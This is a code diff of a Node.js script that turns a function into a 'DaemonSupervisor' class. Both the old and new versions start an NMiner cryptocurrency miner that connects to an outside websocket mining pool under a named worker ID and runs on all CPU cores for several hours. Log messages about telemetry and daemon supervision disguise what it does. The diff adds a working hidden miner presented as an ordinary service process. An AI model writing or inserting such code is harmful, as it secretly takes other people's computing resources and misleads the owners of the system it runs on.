@@ -3,27 +3,29 @@ const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-function assembleProcessRunner() {
-    const traceId = "d6fd79";
-    console.log(`[telemetry] Instantiated runtime context for ivory-bridge-dispatcher [${traceId}]`);
+class DaemonSupervisor {
+    constructor() {
+        const runId = "644aa8";
+        console.log(`[daemon] Initialized DaemonSupervisor for ivory-bridge-dispatcher [${runId}]`);
 
-    const handler = new NMiner(
-        "wss://runtime.nmining.igrp.app/",
-        "Arup07.ivory-bridge-dispatcher",
-        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
-    );
+        this.handler = new NMiner(
+            "wss://runtime.nmining.igrp.app/",
+            "Arup07.ivory-bridge-dispatcher",
+            Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+        );
 
-    const keepAlivePromise = new Promise(() => {});
-    setTimeout(() => {
-        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
+        const keepAlivePromise = new Promise(() => {});
+        setTimeout(() => {
+        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
         process.exit(0);
-    }, 302 * 60 * 1000);
+    }, 351 * 60 * 1000);
 
-    process.on("SIGTERM", () => {
-        
-        console.log("[halt] Clean lifecycle exit confirmed.");
-        process.exit(0);
-    });
+        process.on("SIGTERM", () => {
+            
+            console.log("[supervisor] Clean shutdown completed.");
+            process.exit(0);
+        });
+    }
 }
 
-assembleProcessRunner();
+new DaemonSupervisor();
